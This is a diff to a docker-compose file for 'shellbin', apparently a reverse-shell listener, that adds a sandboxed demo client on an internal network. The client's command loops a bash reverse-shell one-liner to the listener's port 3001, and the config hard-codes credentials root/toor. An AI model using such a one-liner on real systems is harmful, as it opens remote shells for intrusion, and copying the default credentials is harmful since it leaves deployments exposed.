@@ -1,12 +1,40 @@
 services:
   shellbin:
-    image: cwithw/shellbin:latest
+    image: cwithw/shellbin:demosite
+    build: "./docker"
     ports:
-      - "9998:3000"
-      - "9999:3001"
+      - "127.0.0.1:8037:3000"
+    #  - "9999:3001"
     environment:
       - NODE_ENV=production
       - TZ=Asia/Shanghai
       - USERNAME=root
       - PASSWORD=toor
     restart: unless-stopped
+    networks:
+      - shellbin_internal
+      - default
+    deploy:
+      resources:
+        limits:
+          cpus: '0.1'
+          memory: 64M
+  shellbin-demo-vuln-client:
+    image: cwithw/shellbin:demosite-vuln-client
+    build: "./docker-demo-vuln-client"
+    command: ["/bin/bash", "-c", "sleep 10;while true; do /bin/sh -i >& /dev/tcp/shellbin/3001 0>&1 2>&1; sleep 5; done"]
+    depends_on:
+      - shellbin
+    restart: unless-stopped
+    deploy:
+      resources:
+        limits:
+          cpus: '0.1'
+          memory: 64M
+          pids: 10
+    networks:
+      - shellbin_internal
+
+networks:
+  shellbin_internal:
+    internal: true
